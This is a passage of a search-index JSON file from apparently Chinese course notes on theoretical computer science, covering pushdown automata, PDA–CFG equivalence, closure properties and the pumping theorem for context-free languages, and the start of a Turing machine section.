<li>\u5b58\u5728\u975e\u7ec8\u7ed3\u7b26\u53f7 \\(S\\to e\\)\uff0c\u5220\u6389\u5e76\u8865\u507f\uff1a<ul> <li>\\(S_0\\to S,\\ S\\to a\\ |\\ b\\ |\\ aSa\\ |\\ bSb\\ |\\ aa\\ |\\ bb\\)</li> </ul> </li> <li>\u5b58\u5728 \\(S\\to aSa\\ |\\ bSb\\) \u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u53f7\u751f\u6210\u4e09\u4e2a\u7b26\u53f7\uff1a<ul> <li>\u65b0\u5efa \\(C\\to Sa,\\ D\\to Sb\\)\uff0c\u66ff\u6362\u5f97\u5230 \\(S_0\\to S,\\ S\\to a\\ |\\ b\\ |\\ aC\\ |\\ bD\\ |\\ aa\\ |\\ bb\\)</li> </ul> </li> <li>\u5b58\u5728\u63a8\u5bfc\u7ed3\u679c\u91cc\u6709 \\(Sa, Sb, aC, bD\\) \u8fd9\u79cd\u5e26\u6709\u7ec8\u7ed3\u7b26\u53f7\u7684\uff1a<ul> <li>\u65b0\u5efa \\(A\\to a,\\ B\\to b\\)\uff0c\u66ff\u6362\u5373\u53ef\u5f97\u5230\u6700\u7ec8\u7684 CNF</li> </ul> </li> </ul> <p>CNF\uff1a\\(S_0\\to S,\\ A\\to a,\\ B\\to b,\\ S\\to a\\ |\\ b\\ |\\ AC\\ |\\ BD\\ |\\ AA\\ |\\ BB\\)</p>"},{"location":"cs/tcs/toc/topic2/#pushdown-automata","title":"Pushdown Automata","text":"<ul> <li>\u4e0b\u63a8\u81ea\u52a8\u673a\uff08Pushdown Automata, PDA\uff09\u662f NFA \u7684\u4e00\u4e2a\u6269\u5c55<ul> <li>\u5728 NFA \u57fa\u7840\u4e0a\u52a0\u4e86\u4e00\u4e2a\u989d\u5916\u7684\u6808\u7ed3\u6784\uff0c\u5e76\u5728\u72b6\u6001\u8f6c\u79fb\u65f6\u4f1a\u8fdb\u884c\u6808\u64cd\u4f5c</li> <li>PDA \u53ef\u4ee5\u548c CFG \u7b49\u4ef7</li> </ul> </li> <li>\u5f62\u5f0f\u5316\u5b9a\u4e49\uff0c\u4e00\u4e2a PDA \u662f\u4e00\u4e2a\u516d\u5143\u7ec4 \\(P=(K, \\Sigma, \\Gamma, \\Delta, s, F)\\)<ul> <li>\u5176\u4e2d \\(K, \\Sigma, s, F\\) \u7684\u542b\u4e49\u548c NFA \u4e2d\u7684\u76f8\u540c</li> <li>\\(\\Gamma\\): stack alphabet\uff0c\u5373\u6808\u91cc\u9762\u4f1a\u51fa\u73b0\u7684\u7b26\u53f7\u96c6\u5408</li> <li>\\(\\Delta\\): transition relation, a finite subset of \\((K\\times (\\Sigma\\cup\\{e\\})\\times \\Gamma^*)\\times (K\\times\\Gamma^*)\\)<ul> <li>\u5bf9\u6bd4 NFA \\((K\\times (\\Sigma\\cup\\{e\\}))\\times K\\)\uff0c\u5373\u5728\u8f6c\u79fb\u524d\u540e\u90fd\u52a0\u4e86\u6808\u76f8\u5173\u5b57\u7b26\u4e32</li> <li>\u524d\u4e00\u4e2a \\(\\Gamma^*\\) \u662f\u6808\u9876\u7684\u5b57\u7b26\u4e32\uff0c\u5339\u914d\u540e pop \u51fa\u6765</li> <li>\u540e\u4e00\u4e2a \\(\\Gamma^*\\) \u662f\u5728\u8f6c\u79fb\u540e\u8981 push \u8fdb\u53bb\u7684\u5b57\u7b26\u4e32\uff08\u4ece\u5c3e\u5230\u5934\u9010\u7b26\u53f7 push\uff09</li> </ul> </li> </ul> </li> <li>configuration\uff1a\\(C\\in K\\times \\Sigma^*\\times \\Gamma^*\\)\uff0c\u5373 PDA \u7684\u72b6\u6001\u3001\u8f93\u5165\u4e32\u3001\u6808\u7684\u72b6\u6001</li> <li>yield in one step \u5f62\u5f0f\u5316\u63cf\u8ff0 \\((p, x, \\alpha)\\vdash_P(q, y, \\beta)\\)\uff1a<ul> <li>if \\(\\exists \\big((p, a, \\gamma), (q, \\eta)\\big)\\in\\Delta\\) s.t. \\(x=ay, \\alpha=\\gamma\\tau, \\beta=\\eta\\tau\\) for some \\(\\tau\\in\\Gamma^*\\)</li> <li>yield \u540c\u6837\u5373\u901a\u8fc7 0 \u6b65\u6216\u66f4\u591a\u6b65\u5230\u8fbe</li> </ul> </li> <li>PDA \u63a5\u53d7\u5b57\u7b26\u4e32\uff1a\\(P\\) accepts \\(w\\in\\Sigma^*\\) if \\((s, w, e)\\vdash_P^*(q, e, e)\\) for some \\(q\\in F\\)<ul> <li>\u8d77\u59cb\u72b6\u6001\u662f\u7a7a\u6808\uff0c\u7ed3\u675f\u72b6\u6001\u8981\u6c42\u4e5f\u662f\u7a7a\u6808\uff0c\u5176\u4ed6\u548c NFA \u76f8\u540c</li> </ul> </li> <li>PDA \u63a5\u53d7\u8bed\u8a00\uff1a\\(P\\) accepts \\(L(P) = \\{w\\in\\Sigma^*: P\\text{ accepts }w\\}\\)</li> </ul> \u6784\u9020 PDA \\(P\\) \u4f7f \\(L(P) = \\{w\\in \\{0, 1\\}^*: \\#0\\text{'s}=\\#1\\text{'s in }w\\}\\) <p>\u5373 0 \u548c 1 \u4e2a\u6570\u76f8\u7b49\u7684 01 \u4e32\uff0c\u601d\u8def\uff08\u5229\u7528\u6808\uff09\uff1a</p> <ul> <li>\u8bfb\u5165 0 \u65f6<ul> <li>\u5982\u679c\u662f\u7a7a\u6808\u6216\u8005\u6808\u9876\u662f 0\uff0c\u5219 push 0</li> <li>\u5426\u5219\uff08\u5373\u6808\u9876\u662f 1\uff09\uff0cpop</li> </ul> </li> <li>\u8bfb\u5165 1 \u65f6<ul> <li>\u5982\u679c\u662f\u7a7a\u6808\u6216\u8005\u6808\u9876\u662f 1\uff0c\u5219 push 1</li> <li>\u5426\u5219\uff08\u5373\u6808\u9876\u662f 0\uff09\uff0cpop</li> </ul> </li> </ul> <p>\u6240\u4ee5\u5bf9\u5e94\u7684 PDA \\(P=(K, \\Sigma, \\Gamma, \\Delta, s, F)\\)\uff1a</p> <ul> <li>\\(K=\\{q\\},\\ s=q,\\ F=\\{q\\},\\ \\Sigma = \\Gamma = \\{0, 1\\}\\)</li> </ul> \\[ \\begin{align*} \\Delta = \\{&amp;\\big((q, 0, 1), (q, e)\\big),\\quad \\text{now is 0 and top is 1 then pop}\\\\            &amp;\\big((q, 0, e), (q, 0)\\big),\\quad \\text{now is 0 and other case then push 0}\\\\            &amp;\\big((q, 1, 0), (q, e)\\big),\\quad \\text{now is 1 and top is 0 then pop}\\\\            &amp;\\big((q, 1, e), (q, 1)\\big)\\}\\quad \\text{now is 1 and other case then push 1} \\end{align*} \\] <p>\u5982\u4e0a\u5373\u53ef\u901a\u8fc7\u4e00\u4e2a\u72b6\u6001\u548c\u56db\u4e2a\u8f6c\u79fb\u89c4\u5219\u6765\u8fbe\u5230\uff0c\u5229\u7528\u4e86 NFA \u201c\u731c\u6d4b\u201d\u7684\u7279\u6027\uff08\u5e76\u4e14\u6ce8\u610f\u4efb\u4f55\u65f6\u5019\u5339\u914d\u5230\u4e86\u90fd\u8981 pop\uff0c\u9664\u975e\u5339\u914d \\(e\\)\uff0c\u4ee5\u53ca push \\(e\\) \u76f8\u5f53\u4e8e\u4e0d\u53d8\u5373\u4ec5 pop\uff09</p>"},{"location":"cs/tcs/toc/topic2/#simple-pda","title":"Simple PDA","text":"<p>\u5b9a\u4e49\u4e00\u4e2a\u66f4\u7b80\u5355\u7684 PDA \u5f62\u5f0f\u7528\u4e8e\u65b9\u4fbf\u540e\u7eed\u8bc1\u660e\u3002</p> <p>A PDA \\(P=(K, \\Sigma, \\Gamma, \\Delta, s, F)\\) is simple, if:</p> <ol> <li>\\(|F| = 1\\)\uff1a\u53ea\u6709\u4e00\u4e2a\u63a5\u53d7\u72b6\u6001</li> <li>for each transition \\(\\big((p, a, \\alpha), (q, \\beta)\\big)\\in\\Delta\\), either<ul> <li>\\(\\alpha=e\\) and \\(|\\beta|=1\\) or </li> <li>\\(|\\alpha|=1\\) and \\(\\beta=e\\)</li> <li>\uff08\u5c31\u662f\u8981\u4e48 pop \u4e00\u4e2a\u5b57\u7b26\uff0c\u8981\u4e48 push \u4e00\u4e2a\u5b57\u7b26\uff09</li> </ul> </li> </ol> \u8bc1\u660e\u4efb\u610f PDA \u90fd\u6709\u7b49\u4ef7 simple PDA <p>\u601d\u8def\u5c31\u662f\u5982\u679c\u6709\u591a\u6b65\u7684 push pop \u64cd\u4f5c\uff0c\u5c31\u8fdb\u884c\u62c6\u5206\uff1a</p> <ul> <li>\u5982\u679c \\(|F|\\neq 1\\)\uff0c\u65b0\u5efa\u4e00\u4e2a\u63a5\u53d7\u72b6\u6001 \\(f'\\)<ul> <li>\\(\\forall q\\in F\\)\uff0c\u65b0\u5efa\u8f6c\u79fb \\(\\big((q, e, e), (f', e)\\big)\\)</li> <li>\u4ee4 \\(F = \\{f'\\}\\)</li> </ul> </li> <li>\u5982\u679c\u4e0d\u6ee1\u8db3\u53ea push/pop \u4e00\u4e2a\u5b57\u7b26\u7684\u6761\u4ef6\uff0c\u5047\u8bbe\u5f53\u524d\u4e0d\u6ee1\u8db3\u7684\u8f6c\u79fb\u662f \\(\\big((p, a, \\alpha), (q, \\beta)\\big)\\)\uff0c\u4f9d\u6b21<ol> <li>\u5982\u679c \\(|\\alpha|\\geq 1\\) \u4e14 \\(|\\beta|\\geq 1\\)\uff08\u540c\u65f6 push/pop \u4e86\uff09<ul> <li>\u65b0\u5efa\u72b6\u6001 \\(r\\)\uff0c\u5c06\u539f\u8f6c\u79fb\u66ff\u6362\u4e3a \\(\\big((p, a, \\alpha), (r, e)\\big),\\ \\big((r, e, e), (q, \\beta)\\big)\\)</li> </ul> </li> <li>\u5982\u679c \\(|\\alpha| &gt; 1\\) \u4e14 \\(\\beta = e\\)\uff08\u4e0d\u6b62 pop \u4e86\u4e00\u4e2a\u5b57\u7b26\uff09<ul> <li>\u5047\u8bbe \\(\\alpha = c_1\\cdots c_k, k\\geq 2\\)</li> <li>\u65b0\u5efa\u72b6\u6001 \\(r_1, \\cdots, r_{k-1}\\)</li> <li>\u5c06\u539f\u8f6c\u79fb\u66ff\u6362\u4e3a \\(\\big((p, a, c_1), (r_1, e)\\big),\\ \\big((r_1, e, c_2), (r_2, e)\\big),\\ \\cdots,\\ \\big((r_{k-1}, e, c_k), (q, e)\\big)\\)</li> </ul> </li> <li>\u5982\u679c \\(\\alpha = e\\) \u4e14 \\(|\\beta| &gt; 1\\)\uff08\u4e0d\u6b62 push \u4e86\u4e00\u4e2a\u5b57\u7b26\uff09<ul> <li>\u548c\u7b2c\u4e8c\u6761\u7c7b\u4f3c\uff0c\u62c6\u5206\u6210 \\(k\\) \u6b65 push</li> </ul> </li> <li>\u5982\u679c \\(\\alpha = \\beta = e\\)\uff08\u6ca1 push \u4e5f\u6ca1 pop\uff09<ul> <li>\u65b0\u5efa\u72b6\u6001 \\(r\\)\uff0c\u4efb\u53d6 \\(b\\in\\Gamma\\)\uff0c\u5c06\u539f\u89c4\u5219\u66ff\u6362\u4e3a \\(\\big((p, a, e), (r, b)\\big),\\ \\big((r, e, b), (q, e)\\big)\\)</li> </ul> </li> </ol> </li> </ul>"},{"location":"cs/tcs/toc/topic2/#pda-cfg","title":"PDA \u4e0e CFG \u7b49\u4ef7","text":"<p>\u5206\u4e24\u4e2a\u90e8\u5206\u8bc1\u660e\uff1a</p>"},{"location":"cs/tcs/toc/topic2/#cfg-pda","title":"CFG -&gt; PDA","text":"<p>\u5bf9\u4efb\u610f CFG \\(G\\)\uff0c\u5b58\u5728 PDA \\(M\\) \u4f7f\u5f97 \\(L(M)=L(G)\\)\uff0c\u8bc1\u660e\u601d\u8def\uff1a</p> <ul> <li>\u5728\u6808\u4e2d\u4ece \\(S\\) \u5f00\u59cb\u975e\u786e\u5b9a\u6027\u5730\u8fdb\u884c\u5b57\u7b26\u4e32\u7684\u751f\u6210</li> <li>\u5c06\u751f\u6210\u7684\u5185\u5bb9\u548c\u8f93\u5165\u6bd4\u8f83</li> <li>\u5982\u679c\u5339\u914d\u5219\u63a5\u53d7</li> </ul> <p>Given \\(G=(V, \\Sigma, S, R)\\Rightarrow P=(K, \\Sigma, \\Gamma, \\Delta, s, F)\\), s.t. \\(L(P)=L(G)\\):</p> <ul> <li>\\(K=\\{s, f\\},\\ s=s,\\ F=\\{f\\},\\ \\Gamma = V\\)</li> <li>\\(\\Delta\\) \u7531\u4ee5\u4e0b\u90e8\u5206\u7ec4\u6210\uff1a<ul> <li>\\(\\big((s, e, e), (f, S)\\big)\\)\uff1a\u8d77\u59cb\u5148 push \u8fdb \\(S\\)</li> <li>\\(\\big((f, a, a), (f, e)\\big),\\forall a\\in\\Sigma\\)\uff1a\u5339\u914d\u5230\u8f93\u5165\u4e32\u5219 pop</li> <li>\\(\\big((f, e, A), (f, u)\\big),\\forall (A, u)\\in R\\)\uff1a\u5bf9\u4e8e\u6240\u6709\u89c4\u5219\u8fdb\u884c\u751f\u6210\uff0c\u975e\u786e\u5b9a\u81ea\u52a8\u673a\u4f1a\u201c\u731c\u6d4b\u201d</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/topic2/#pda-cfg_1","title":"PDA -&gt; CFG","text":"<p>\u524d\u9762\u8bc1\u660e\u4e86\u4efb\u610f PDA -&gt; simple PDA\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u8bc1\u660e simple PDA -&gt; CFG \u5373\u53ef\u3002</p> <p>Given \\(P=(K, \\Sigma, \\Gamma, \\Delta, s, F)\\) is simple \\(\\Rightarrow G=(V, \\Sigma, S, R)\\), s.t. \\(L(P)=L(G)\\):</p> <ul> <li>\u8bbe\u7acb\u4e00\u7cfb\u5217\u975e\u7ec8\u7ed3\u7b26\u53f7\uff1a\\(\\{A_{pq}: (p, q)\\in K\\times K\\}\\)\uff0c\u8868\u793a\u4ece\u72b6\u6001 \\(p\\) \u5230\u72b6\u6001 \\(q\\) \u7684\u8def\u5f84<ul> <li>\u8bbe\u7acb\u7684\u76ee\u6807\uff1a\\(A_{pq}\\Rightarrow^* w\\in\\Sigma^*\\) iff \\((p, w, e)\\vdash_P^*(q, e, e)\\)</li> </ul> </li> <li>\u8d77\u59cb\u7b26\u53f7\uff1a\\(S=A_{sf}\\)<ul> <li>\u56e0\u4e3a \\(s\\in L(P)\\) iff \\((s, w, e)\\vdash_P^*(f, e, e)\\)</li> </ul> </li> <li>\u8f6c\u79fb\u5173\u7cfb \\(R\\)<ul> <li>\\(\\forall p\\in K\\)\uff0c\\(A_{pp}\\to e\\)</li> <li>\\(\\forall p, q, r\\in K\\)\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff1a<ul> <li>\u5982\u679c\u5728\u4ece \\(p\\) \u8f6c\u79fb\u5230 \\(q\\) \u7684\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u4e86\u4e00\u4e2a\u65f6\u523b\u5728\u72b6\u6001 \\(r\\) \u4e14\u6808\u662f\u7a7a\u7684<ul> <li>\\(A_{pq}\\to A_{pr}A_{rq}, \\forall r\\in K\\)</li> </ul> </li> <li>\u5982\u679c\u8fc7\u7a0b\u4e2d\u6ca1\u6709\u51fa\u73b0\u8fc7\u4efb\u4f55\u4e00\u6b21\u6808\u4e3a\u7a7a\u7684\u60c5\u51b5<ul> <li>\u6ce8\u610f\u5230\u7b2c\u4e00\u6b65\u548c\u6700\u540e\u4e00\u6b65\u6709\u5bf9\u5e94\u5173\u7cfb\uff0c\u5047\u8bbe\u7b2c\u4e00\u6b65\u8bfb\u53d6 \\(a\\) \u5e76 push \\(\\alpha\\)\uff0c\u6700\u540e\u4e00\u6b65\u8bfb\u53d6 \\(b\\) \u5e76 pop \\(\\alpha\\)\uff0c\u6240\u4ee5\u53ef\u4ee5\u6dfb\u52a0\u4ee5\u4e0b\u8f6c\u79fb\uff1a</li> <li>\\(A_{pq}\\to aA_{p'q'}b, \\forall\\big((p, a, e), (p', \\alpha)\\big), \\big((q', b, \\alpha), (q, e)\\big)\\in\\Delta\\text{ for some }\\alpha\\in\\Gamma\\)</li> </ul> </li> </ul> </li> </ul> </li> </ul> <p>\u8fd9\u6837\u5c31\u51fa\u73b0\u4e86\u4e00\u4e2a\u7c7b\u4f3c DP \u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u8bc1\u660e \\(A_{pq}\\Rightarrow^* w\\in\\Sigma^*\\) iff \\((p, w, e)\\vdash_P^*(q, e, e)\\)\uff1a</p> <ul> <li>\u5de6\u63a8\u53f3\uff1aby induction on length of derivation from \\(A_{pq}\\) to \\(w\\)</li> <li>\u53f3\u63a8\u5de6\uff1aby induction on number of steps of computation</li> </ul>"},{"location":"cs/tcs/toc/topic2/#cfl","title":"CFL \u6027\u8d28","text":""},{"location":"cs/tcs/toc/topic2/#closure-properties","title":"Closure Properties","text":"<p>PDA \u53ef\u4ee5\u5b9a\u4e49\u4e00\u4e2a CFL\uff0c\u6240\u4ee5\u6839\u636e PDA \u7684\u7ed3\u6784\uff0cCFL \u6709\u4ee5\u4e0b\u6027\u8d28\uff1a</p> <p>\u5982\u679c \\(A\\) \u548c \\(B\\) \u662f CFL\uff0c\u5219 \\(A\\cup B, A\\circ B, A^*\\) \u4e5f\u662f CFL\uff0c\u4f46 \\(A\\cap B, \\overline{A}\\) \u4e0d\u4e00\u5b9a\u662f CFL\u3002\u7b80\u5355\u8bc1\u660e\uff1a\u8bbe \\(G_A=(V_A,\\Sigma,S_A,R_A), G_B=(V_B,\\Sigma,S_B,R_B)\\)\uff0c\u5219\uff1a</p> <ul> <li>\\(G_{A\\cup B}\\)\uff1a\u89c4\u5219 \\(S\\to S_A\\ |\\ S_B\\)</li> <li>\\(G_{A\\circ B}\\)\uff1a\u89c4\u5219 \\(S\\to S_AS_B\\)</li> <li>\\(G_{A^*}\\)\uff1a\u89c4\u5219 \\(S\\to e\\ |\\ SS_A\\)</li> </ul> <p>\u9488\u5bf9 \\(\\cap, \\overline{A}\\)\uff0c\u53ef\u4ee5\u6784\u9020\u53cd\u4f8b\uff1a</p> <ul> <li>\\(A=\\{a^ib^jc^k:i=j\\}, B=\\{a^ib^jc^k:j=k\\}\\) \u90fd\u662f context-free \u7684</li> <li>\\(A\\cap B = \\{a^nb^nc^n:n\\geq 0\\}\\) \u4e0d\u662f context-free \u7684\uff08\u540e\u9762\u4f1a\u901a\u8fc7 pumping theorem \u8bc1\u660e\uff09</li> <li>\\(A\\cap B = \\overline{\\overline{A}\\cup\\overline{B}}\\)\uff0c\u6240\u4ee5 \\(\\cap\\) \u4e0d\u5c01\u95ed\u5219 \\(\\overline{A}\\) \u4e5f\u4e0d\u5c01\u95ed</li> </ul>"},{"location":"cs/tcs/toc/topic2/#pumping-theorem-for-cfl","title":"Pumping Theorem for CFL","text":"<p>\u7c7b\u4f3c\u6b63\u5219\u8bed\u8a00\u7684 pumping theorem\uff0cCFL \u4e5f\u6709\u4e00\u4e2a\u76f8\u4f3c\u7684\u5b9a\u7406\uff1a</p> <ul> <li>\u4ee4 \\(L\\) \u4e3a\u4e00\u4e2a CFL</li> <li>\u5219\u5b58\u5728\u4e00\u4e2a\u6574\u6570 \\(p\\geq 1\\)\uff08\u79f0\u4e3a pumping length\uff09</li> <li>\u4f7f\u5f97\u5bf9\u4e8e\u6240\u6709\u957f\u5ea6\u4e0d\u5c0f\u4e8e \\(p\\) \u7684\u5b57\u7b26\u4e32 \\(w\\in L\\)</li> <li>\u90fd\u53ef\u4ee5\u5c06 \\(w\\) \u5206\u89e3\u4e3a\u4e94\u4e2a\u90e8\u5206 \\(w=uvxyz\\) \u6ee1\u8db3\uff1a<ol> <li>\u5bf9\u4e8e\u4efb\u610f \\(i\\geq 0\\)\uff0c\u6709 \\(uv^ixy^iz\\in L\\)</li> <li>\\(|v| + |y| &gt; 0\\)</li> <li>\\(|vxy| \\leq p\\)</li> </ol> </li> </ul> <p>\u8bc1\u660e\u601d\u8def\uff1a\u975e\u7ec8\u7ed3\u7b26\u53f7\u4e00\u5171\u6709 \\(V-\\Sigma\\) \u662f\u6709\u9650\u7684\uff0c\u4f46\u751f\u6210\u7684\u5b57\u7b26\u4e32\u53ef\u4ee5\u662f\u65e0\u9650\u957f\u7684\uff0c\u6240\u4ee5\u751f\u6210\u8fc7\u7a0b\u4ea7\u751f\u7684 parse tree \u4e2d\u4e00\u5b9a\u4f1a\u6709\u91cd\u590d\u7684\u975e\u7ec8\u7ed3\u7b26 \\(Q\\)\uff0c\u7b80\u5355\u753b\u6210\u5982\u4e0b\uff1a</p> <p>\u5373\u4e00\u5c42\u4e00\u5c42\u4ece\u4e0a\u5230\u4e0b\u751f\u6210\uff0c\u6700\u7ec8\u63a8\u5bfc\u751f\u6210 \\(uvxyz\\)\uff0c\u53ef\u89c1\u4e00\u5b9a\u6709\u4ee5\u4e0b\u7ed3\u8bba\uff1a</p> <ul> <li>\\(S\\Rightarrow^* uQz,\\ Q\\Rightarrow^* vQy,\\ Q\\Rightarrow^* x\\)</li> <li>\u56e0\u6b64\u6709 \\(uv^ixy^iz\\in L\\)</li> </ul> \u5177\u4f53\u7684\u8bc1\u660e <p>\\(L\\) \u662f CFL\uff0c\u5219\u5b58\u5728 CFG \\(G=(V,\\Sigma, S, R)\\) \u751f\u6210\u5b83\u3002\u4ee4 \\(b=\\max\\{|u|:(A,u)\\in R\\}\\) \u5373\u6240\u6709\u89c4\u5219\u91cc\u53f3\u4fa7\u6700\u957f\u7684\uff0c\u79f0 \\(\\mathrm{fanout}\\leq b\\)\u3002\u4e5f\u53ef\u4ee5\u77e5\u9053\u5728\u5982\u4e0a\u7684 parse tree \u4e2d\uff0c\u4e00\u4e2a\u8282\u70b9\u6700\u591a\u6709 \\(b\\) \u4e2a\u5b50\u8282\u70b9\u3002</p> <p>\u6211\u4eec\u5df2\u77e5\u5982\u679c\u4e00\u68f5\u6811\u6709 \\(\\mathrm{fanout}\\leq b\\) \u4e14\u6709 \\(n\\) \u4e2a\u53f6\u8282\u70b9\uff0c\u5219\u5b83\u7684\u9ad8\u5ea6\u4e0d\u5c0f\u4e8e \\(\\log_bn\\)\u3002\u6240\u4ee5\u6211\u4eec\u4ee4 pumping length \\(p=b^{|V-\\Sigma|+1}\\)\uff0c\u8fd9\u6837\u53d6\u957f\u5ea6\u4e0d\u5c0f\u4e8e \\(p\\) \u7684\u5b57\u7b26\u4e32 \\(w\\in L\\)\uff0c\u4ee4 \\(T\\) \u662f\u751f\u6210 \\(w\\) \u7684\u4e14\u6709\u6700\u5c11\u8282\u70b9\u6570\u7684 parse tree\u3002\u6b64\u65f6\u5b57\u7b26\u4e32\u4e2d\u7684\u6240\u6709\u7b26\u53f7\u90fd\u662f\u53f6\u8282\u70b9\uff0c\u90a3 \\(T\\) \u7684\u9ad8\u5ea6\u5c31\u4e0d\u5c0f\u4e8e \\(\\log_bp=|V-\\Sigma|+1\\)\u3002\u6240\u4ee5\u6709\u5982\u4e0b\u7ed3\u8bba\uff1a</p> <ul> <li>\u5728\u6700\u957f\u7684\u4e00\u6761\u8def\u5f84\u4e0a\uff0c\u6709\uff1a<ul> <li>\\(\\text{\\#edges}\\geq |V-\\Sigma|+1\\)</li> <li>\\(\\text{\\#nodes}\\geq |V-\\Sigma|+2\\)</li> <li>\\(\\text{\\#non-terminals}\\geq |V-\\Sigma|+1\\)</li> </ul> </li> <li>\u6240\u4ee5\u5728\u8fd9\u6761\u8def\u5f84\u4e0a\u4e00\u5b9a\u6709\u81f3\u5c11\u4e00\u4e2a\u975e\u7ec8\u7ed3\u7b26\u53f7\u51fa\u73b0\u4e86\u81f3\u5c11\u4e24\u6b21\uff0c\u6211\u4eec\u53d6\u6700\u4f4e\u7684\u4e00\u5bf9\u4e3a \\(Q\\)</li> </ul> <p>\u63a5\u4e0b\u6765\u662f\u4e09\u6761\u7ed3\u8bba\uff1a</p> <ol> <li>\\(uv^ixy^iz\\in L\\) \u663e\u7136</li> <li>\\(|v|+|y| &gt; 0\\)<ul> <li>\u552f\u4e00\u4e0d\u6210\u7acb\u7684\u60c5\u51b5\u662f \\(v=y=e\\)\uff0c\u5047\u8bbe\u662f\u8fd9\u79cd\u60c5\u51b5\uff0c\u6240\u4ee5 \\(w=uxz\\)</li> <li>\u8fd9\u6837\u5c31\u80fd\u627e\u5230\u4e00\u68f5\u6bd4 \\(T\\) \u8282\u70b9\u6570\u66f4\u5c11\u7684 parse tree\uff08\u5c11\u4e2a \\(Q\\)\uff09\uff0c\u4e0e\u5047\u8bbe\u77db\u76fe</li> </ul> </li> <li>\\(|vxy|\\leq p\\)<ul> <li>\u53ea\u8003\u8651\u4ece\u4e0a\u9762\u7684 \\(Q\\) \u5f00\u59cb\u7684\u5b50\u6811 <ul> <li>\u5982\u679c\u53ef\u4ee5\u8bc1\u660e\u5176\u9ad8\u5ea6\u4e0d\u5927\u4e8e \\(|V-\\Sigma|+1\\)</li> <li>\u5c31\u53ef\u4ee5\u8bc1\u660e \\(|vxy|=\\text{\\#leaves}\\leq b^{h+1}\\leq b^{|V-\\Sigma|+1}=p\\)</li> </ul> </li> <li>\u8fd9\u91cc\u5b50\u6811\u7684\u9ad8\u5ea6\u5c31\u662f \\(QQa\\) \u8fd9\u6761\u8def\u5f84\u7684\u957f\u5ea6<ul> <li>\u56e0\u4e3a\u6211\u4eec\u5047\u8bbe\u4e86 \\(QQ\\) \u662f\u6700\u4f4e\u7684\u4e00\u5bf9</li> <li>\u6240\u4ee5\u8fd9\u6761\u8def\u5f84\u4e0a\u4e0d\u4f1a\u518d\u5b58\u5728\u5176\u4ed6\u91cd\u590d\u7684\u975e\u7ec8\u7ed3\u7b26\u53f7</li> <li>\u56e0\u4e3a\u975e\u7ec8\u7ed3\u7b26\u53f7\u53ea\u6709 \\(|V-\\Sigma|\\) \u4e2a\uff0c\u6240\u4ee5\u8def\u5f84\u957f\u5ea6\u4e0d\u4f1a\u8d85\u8fc7 \\(|V-\\Sigma|+1\\)</li> </ul> </li> </ul> </li> </ol> \u8bc1\u660e \\(L=\\{a^nb^nc^n:n\\geq 0\\}\\) \u4e0d\u662f context-free \u7684 <p>\u53cd\u8bc1\u6cd5\uff0c\u5047\u8bbe \\(L\\) \u662f CFL\uff0c\u4ee4 \\(p\\) \u4e3a\u5176 pumping length\uff0c\u53d6 \\(w=a^pb^pc^p\\)\uff0c\u5219\u53ef\u4ee5\u62c6\u5206 \\(w=uvxyz\\)\u3002</p> <p>\u6839\u636e pumping theorem\uff0c\\(|vxy|\\leq p\\)\uff0c\u6240\u4ee5\u6709\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\uff1a</p> <ul> <li>\\(vxy\\) \u53ea\u5305\u542b \\(b\\)\uff1a\u5219 \\(uv^0xy^0z=uxz\\) \u4e2d \\(b\\) \u7684\u6570\u91cf\u5c31\u4f1a\u6bd4 \\(a,c\\) \u90fd\u5c11\uff0c\u6240\u4ee5\u4e0d\u5728 \\(L\\) \u4e2d</li> <li>\\(vxy\\) \u4e2d\u5305\u542b \\(a,c\\) \u4e2d\u7684\u67d0\u4e00\u4e2a\uff08\u53e6\u4e00\u4e2a\u4e00\u5b9a\u4e0d\u4f1a\u5728\u5176\u4e2d\uff09\uff1a\u5219 \\(uv^0xy^0z=uxz\\) \u4e2d \\(a,c\\) \u7684\u6570\u91cf\u5c31\u4f1a\u4e0d\u5e73\u8861\uff0c\u6240\u4ee5\u4e0d\u5728 \\(L\\) \u4e2d</li> </ul> <p>\u4e0e\u7b2c\u4e00\u6761\u77db\u76fe\uff0c\u6240\u4ee5 \\(L\\) \u4e0d\u662f CFL\u3002</p>"},{"location":"cs/tcs/toc/topic3/","title":"\u56fe\u7075\u673a\u7406\u8bba\u57fa\u7840","text":"<p> \u7ea6 2795 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 9 \u5206\u949f</p> <p>Abstract</p> <p>\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15\u7b2c\u516b\u81f3\u7b2c\u4e5d\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/tcs/toc/topic3/#_2","title":"\u56fe\u7075\u673a","text":""},{"location":"cs/tcs/toc/topic3/#_3","title":"\u57fa\u672c\u5b9a\u4e49","text":"<ul> <li>\u4e00\u4e2a\u201c\u7eb8\u5e26\u201d\uff0c\u4e00\u4e2a\u8bfb\u5199\u5934\u53ef\u8fdb\u884c\u5355\u5143\u683c\u7684\u5de6\u53f3\u79fb\u52a8\u548c\u7b26\u53f7\u7684\u8bfb\u5199<ul> <li>\u7279\u6b8a\u7b26\u53f7 \\(\\rhd\\)\uff08left end symbol\uff09\u8868\u793a\u7eb8\u5e26\u7684\u6700\u5de6\u4fa7\uff0c\u65e0\u6cd5\u8986\u76d6</li> <li>\u7279\u6b8a\u7b26\u53f7 \\(\u2334\\)\uff08black symbol\uff09\u8868\u793a\u7eb8\u5e26\u8fd9\u4e2a\u4f4d\u7f6e\u662f\u4e00\u4e2a\u7a7a\u683c\u5b50</li> </ul> </li> <li>\u4e00\u4e2a\u56fe\u7075\u673a\u5b9a\u4e49\u4e3a\u4e00\u4e2a\u4e94\u5143\u7ec4 \\(M=(K, \\Sigma, \\delta, s, H)\\)<ul> <li>\\(K\\)\uff1a\u72b6\u6001\u7684\u6709\u9650\u96c6\u5408</li> <li>\\(\\Sigma\\)\uff1a\u7eb8\u5e26\u4e0a\u53ef\u4ee5\u51fa\u73b0\u7684\u7b26\u53f7\uff08\u5305\u62ec \\(\\rhd\u2334\\)\uff09</li> <li>\\(s\\in K\\)\uff1a\u8d77\u59cb\u72b6\u6001</li> <li>\\(H\\subseteq 